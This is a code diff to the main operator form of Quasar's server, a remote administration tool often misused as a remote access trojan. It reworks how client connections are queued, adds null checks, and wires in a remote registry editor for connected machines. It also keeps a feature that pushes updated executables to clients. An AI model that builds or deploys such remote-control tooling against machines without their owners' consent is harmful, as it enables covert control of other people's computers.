@@ -18,14 +18,17 @@ namespace xServer.Forms
 {
     public partial class FrmMain : Form
     {
-        public ServerHandler ConServer { get; set; }
+        public QuasarServer ListenServer { get; set; }
         public static FrmMain Instance { get; private set; }
 
         private const int STATUS_ID = 4;
         private const int USERSTATUS_ID = 5;
 
-        private readonly object _lockClients = new object();
         private bool _titleUpdateRunning;
+        private bool _processingClientConnections;
+        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
+        private readonly object _processingClientConnectionsLock = new object();
+        private readonly object _lockClients = new object(); // lock for clients-listview
 
         private void ShowTermsOfService()
         {
@@ -40,7 +43,7 @@ namespace xServer.Forms
         {
             Instance = this;
 
-            AES.PreHashKey(Settings.Password);
+            AES.SetDefaultKey(Settings.Password);
 
 #if !DEBUG
             if (Settings.ShowToU)
@@ -59,12 +62,13 @@ namespace xServer.Forms
                 this.Invoke((MethodInvoker) delegate
                 {
                     int selected = lstClients.SelectedItems.Count;
-                    this.Text = (selected > 0) ?
-                        string.Format("Quasar - Connected: {0} [Selected: {1}]", ConServer.ConnectedClients, selected) :
-                        string.Format("Quasar - Connected: {0}", ConServer.ConnectedClients);
+                    this.Text = (selected > 0)
+                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
+                            selected)
+                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
                 });
             }
-            catch
+            catch (Exception)
             {
             }
             _titleUpdateRunning = false;
@@ -72,24 +76,24 @@ namespace xServer.Forms
 
         private void InitializeServer()
         {
-            ConServer = new ServerHandler();
+            ListenServer = new QuasarServer();
 
-            ConServer.ServerState += ServerState;
-            ConServer.ClientConnected += ClientConnected;
-            ConServer.ClientDisconnected += ClientDisconnected;
+            ListenServer.ServerState += ServerState;
+            ListenServer.ClientConnected += ClientConnected;
+            ListenServer.ClientDisconnected += ClientDisconnected;
         }
 
-        private void AutostartListeningP()
+        private void AutostartListening()
         {
             if (Settings.AutoListen && Settings.UseUPnP)
             {
                 UPnP.Initialize(Settings.ListenPort);
-                ConServer.Listen(Settings.ListenPort);
+                ListenServer.Listen(Settings.ListenPort);
             }
             else if (Settings.AutoListen)
             {
                 UPnP.Initialize();
-                ConServer.Listen(Settings.ListenPort);
+                ListenServer.Listen(Settings.ListenPort);
             }
             else
             {
@@ -105,12 +109,12 @@ namespace xServer.Forms
         private void FrmMain_Load(object sender, EventArgs e)
         {
             InitializeServer();
-            AutostartListeningP();
+            AutostartListening();
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
-            ConServer.Disconnect();
+            ListenServer.Disconnect();
             UPnP.DeletePortMap(Settings.ListenPort);
             notifyIcon.Visible = false;
             notifyIcon.Dispose();
@@ -128,8 +132,11 @@ namespace xServer.Forms
             {
                 this.Invoke((MethodInvoker) delegate
                 {
+                    if (!listening)
+                        lstClients.Items.Clear();
                     listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                 });
+                UpdateWindowTitle();
             }
             catch (InvalidOperationException)
             {
@@ -138,28 +145,95 @@ namespace xServer.Forms
 
         private void ClientConnected(Client client)
         {
-            AddClientToListview(client);
-            if (Settings.ShowPopup)
-                ShowPopup(client);
+            lock (_clientConnections)
+            {
+                if (!ListenServer.Listening) return;
+                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
+            }
+
+            lock (_processingClientConnectionsLock)
+            {
+                if (!_processingClientConnections)
+                {
+                    _processingClientConnections = true;
+                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
+                }
+            }
         }
 
         private void ClientDisconnected(Client client)
         {
-            RemoveClientFromListview(client);
+            lock (_clientConnections)
+            {
+                if (!ListenServer.Listening) return;
+                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
+            }
+
+            lock (_processingClientConnectionsLock)
+            {
+                if (!_processingClientConnections)
+                {
+                    _processingClientConnections = true;
+                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
+                }
+            }
+        }
+
+        private void ProcessClientConnections(object state)
+        {
+            while (true)
+            {
+                KeyValuePair<Client, bool> client;
+                lock (_clientConnections)
+                {
+                    if (!ListenServer.Listening)
+                    {
+                        _clientConnections.Clear();
+                    }
+
+                    if (_clientConnections.Count == 0)
+                    {
+                        lock (_processingClientConnectionsLock)
+                        {
+                            _processingClientConnections = false;
+                        }
+                        return;
+                    }
+
+                    client = _clientConnections.Dequeue();
+                }
+
+                if (client.Key != null)
+                {
+                    switch (client.Value)
+                    {
+                        case true:
+                            AddClientToListview(client.Key);
+                            if (Settings.ShowPopup)
+                                ShowPopup(client.Key);
+                            break;
+                        case false:
+                            RemoveClientFromListview(client.Key);
+                            break;
+                    }
+                }
+            }
         }
 
         /// <summary>
         /// Sets the tooltip text of the listview item of a client.
         /// </summary>
-        /// <param name="c">The client on which the change is performed.</param>
+        /// <param name="client">The client on which the change is performed.</param>
         /// <param name="text">The new tooltip text.</param>
-        public void SetToolTipText(Client c, string text)
+        public void SetToolTipText(Client client, string text)
         {
+            if (client == null) return;
+
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
                 {
-                    var item = GetListViewItemByClient(c);
+                    var item = GetListViewItemByClient(client);
                     if (item != null)
                         item.ToolTipText = text;
                 });
@@ -175,7 +249,7 @@ namespace xServer.Forms
         /// <param name="client">The client to add.</param>
         private void AddClientToListview(Client client)
         {
-            if (client == null || !client.Authenticated) return;
+            if (client == null) return;
 
             try
             {
@@ -205,9 +279,11 @@ namespace xServer.Forms
         /// <summary>
         /// Removes a connected client from the Listview.
         /// </summary>
-        /// <param name="c">The client to remove.</param>
-        private void RemoveClientFromListview(Client c)
+        /// <param name="client">The client to remove.</param>
+        private void RemoveClientFromListview(Client client)
         {
+            if (client == null) return;
+
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
@@ -215,7 +291,7 @@ namespace xServer.Forms
                     lock (_lockClients)
                     {
                         foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && (lvi.Tag as Client) != null && c.Equals((Client) lvi.Tag)))
+                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                         {
                             lvi.Remove();
                             break;
@@ -232,15 +308,17 @@ namespace xServer.Forms
         /// <summary>
         /// Sets the status of a client.
         /// </summary>
-        /// <param name="c">The client to update the status of.</param>
+        /// <param name="client">The client to update the status of.</param>
         /// <param name="text">The new status.</param>
-        public void SetStatusByClient(Client c, string text)
+        public void SetStatusByClient(Client client, string text)
         {
+            if (client == null) return;
+
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
                 {
-                    var item = GetListViewItemByClient(c);
+                    var item = GetListViewItemByClient(client);
                     if (item != null)
                         item.SubItems[STATUS_ID].Text = text;
                 });
@@ -253,18 +331,17 @@ namespace xServer.Forms
         /// <summary>
         /// Sets the user status of a client.
         /// </summary>
-        /// <remarks>
-        /// Can be "Active" or "Idle".
-        /// </remarks>
-        /// <param name="c">The client to update the user status of.</param>
+        /// <param name="client">The client to update the user status of.</param>
         /// <param name="userStatus">The new user status.</param>
-        public void SetUserStatusByClient(Client c, UserStatus userStatus)
+        public void SetUserStatusByClient(Client client, UserStatus userStatus)
         {
+            if (client == null) return;
+
             try
             {
                 lstClients.Invoke((MethodInvoker) delegate
                 {
-                    var item = GetListViewItemByClient(c);
+                    var item = GetListViewItemByClient(client);
                     if (item != null)
                         item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                 });
@@ -277,16 +354,18 @@ namespace xServer.Forms
         /// <summary>
         /// Gets the Listview item which belongs to the client. 
         /// </summary>
-        /// <param name="c">The client to get the Listview item of.</param>
+        /// <param name="client">The client to get the Listview item of.</param>
         /// <returns>Listview item of the client.</returns>
-        private ListViewItem GetListViewItemByClient(Client c)
+        private ListViewItem GetListViewItemByClient(Client client)
         {
+            if (client == null) return null;
+
             ListViewItem itemClient = null;
 
             lstClients.Invoke((MethodInvoker) delegate
             {
                 itemClient = lstClients.Items.Cast<ListViewItem>()
-                    .FirstOrDefault(lvi => lvi != null && lvi.Tag is Client && c.Equals((Client)lvi.Tag));
+                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
             });
 
             return itemClient;
@@ -295,7 +374,7 @@ namespace xServer.Forms
         /// <summary>
         /// Gets all selected clients.
         /// </summary>
-        /// <returns>An array of selected Clients.</returns>
+        /// <returns>An array of all selected Clients.</returns>
         private Client[] GetSelectedClients()
         {
             List<Client> clients = new List<Client>();
@@ -307,12 +386,21 @@ namespace xServer.Forms
                     if (lstClients.SelectedItems.Count == 0) return;
                     clients.AddRange(
                         lstClients.SelectedItems.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && lvi.Tag is Client)
-                            .Select(lvi => (Client)lvi.Tag));
+                            .Where(lvi => lvi != null)
+                            .Select(lvi => lvi.Tag as Client));
                 }
             });
 
             return clients.ToArray();
+        }
+
+        /// <summary>
+        /// Gets all connected clients.
+        /// </summary>
+        /// <returns>An array of all connected Clients.</returns>
+        private Client[] GetConnectedClients()
+        {
+            return ListenServer.ConnectedClients;
         }
 
         /// <summary>
@@ -367,7 +455,6 @@ namespace xServer.Forms
                                     if (error) continue;
 
                                     FileSplit srcFile = new FileSplit(Core.Data.Update.UploadPath);
-                                    var fileName = FileHelper.GetRandomFilename(8, ".exe");
                                     if (srcFile.MaxBlocks < 0)
                                     {
                                         MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
@@ -391,7 +478,7 @@ namespace xServer.Forms
                                             error = true;
                                             break;
                                         }
-                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, fileName, block, srcFile.MaxBlocks, currentBlock).Execute(c);
+                                        new Core.Packets.ServerPackets.DoClientUpdate(id, string.Empty, string.Empty, block, srcFile.MaxBlocks, currentBlock).Execute(c);
                                     }
                                 }
                             }).Start();
@@ -525,7 +612,20 @@ namespace xServer.Forms
 
         private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            // TODO
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    if (c.Value.FrmRe != null)
+                    {
+                        c.Value.FrmRe.Focus();
+                        return;
+                    }
+
+                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
+                    frmRE.Show();
+                }
+            }
         }
 
         private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
@@ -728,7 +828,7 @@ namespace xServer.Forms
 
         private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            using (var frm = new FrmSettings(ConServer))
+            using (var frm = new FrmSettings(ListenServer))
             {
                 frm.ShowDialog();
             }
@@ -767,5 +867,10 @@ namespace xServer.Forms
         }
 
         #endregion
+
+        private void contextMenuStrip_Opening(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+
+        }
     }
 }
